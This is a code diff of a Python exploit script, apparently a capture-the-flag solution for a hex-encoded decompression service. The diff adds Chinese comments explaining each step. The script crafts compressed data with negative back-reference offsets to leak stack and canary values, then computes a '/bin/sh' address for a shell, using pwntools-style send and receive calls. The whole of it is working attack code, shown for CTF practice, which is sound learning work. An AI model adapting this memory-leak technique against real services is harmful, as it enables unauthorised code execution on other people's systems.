@@ -16,9 +16,10 @@ def un_number(number_string):
     return number
 
 
+# 0xff 后跟的数据, 数据是7bit拼接起来的, 可参考压缩函数内的伪代码
 def handle_number(number, sig=0):
     string = ""
-    if sig > 0:
+    if sig > 0: # 负数
         number = (~(number) + 1) & 0xffffffffffffffff
     while(1):
         if (number > 0x7f):
@@ -29,6 +30,19 @@ def handle_number(number, sig=0):
             string += "{:02x}".format(number)
             return string
 
+# 设置重复数据, 用于第一段利用
+def repeat(characters, repetition, sig = 0):
+    if sig == 0:
+        return "ff" + handle_number(characters) + handle_number(repetition)
+    if sig == 1:
+        return "ff" + handle_number(characters, 1) + handle_number(repetition)
+    # 后面这俩没啥用, 因为不需要repetition为负数.
+    if sig == 2:
+        return "ff" + handle_number(characters) + handle_number(repetition, 1)
+    if sig == 3:
+        return "ff" + handle_number(characters, 1) + handle_number(repetition, 1)
+
+# 处理数据,转化为压缩数据内储存的形式. (这段写的不好)
 def handle_datas(datas):
     string = ""
     for data in datas:
@@ -41,17 +55,8 @@ def handle_data(data):
         string += "{:02x}".format(i)
     return string
 
-def repeat(characters, repetition, sig = 0):
-    if sig == 0:
-        return "ff" + handle_number(characters) + handle_number(repetition)
-    if sig == 1:
-        return "ff" + handle_number(characters, 1) + handle_number(repetition)
-    if sig == 2:
-        return "ff" + handle_number(characters) + handle_number(repetition, 1)
-    if sig == 3:
-        return "ff" + handle_number(characters, 1) + handle_number(repetition, 1)
 
-
+# 压缩一段数据, 用来第二段利用
 def compress(datas, repetitions):
     comp = ""
     for data in datas:
@@ -59,6 +64,7 @@ def compress(datas, repetitions):
     comp += "ff" + handle_number(len(datas) * 0x8) + handle_number(repetitions-1)
     return comp
 
+# 填充 `1*8` 个数据
 def pad8(len):
     return '11' * len * 8
 
@@ -86,11 +92,13 @@ def sig2(cn):
 
     # payload = magic + repeat(0x204*8, 8, 1) + repeat(0x200 * 8, 8, 1) + repeat(0x1ff * 8, 8, 1) + repeat(0x201*8, 8, 1) + repeat(0x20, 0x1020)+ end
     payload = magic + repeat(0x208*8, 8, 1) + repeat(0x200*8, 8, 1) + handle_data(0x3) + repeat(0x201*8, 8, 1) + repeat(0x20, 0x1050)+ end
-
+    #           magic   stack                   canary                  pad                 start
     # gdb.attach(cn, cmd)
     print(payload)
     cn.sendlineafter("Send me the hex-encoded string (max 4k):", payload)
     cn.recvuntil("That decompresses to:\n")
+    
+    # 想把/bin/sh写到这里, 后来发现远程的偏移量不同
     stack = un_number(cn.recvn(16, 2).decode())
     print("stack: " + hex(stack))
     binsh = stack - 0x1128
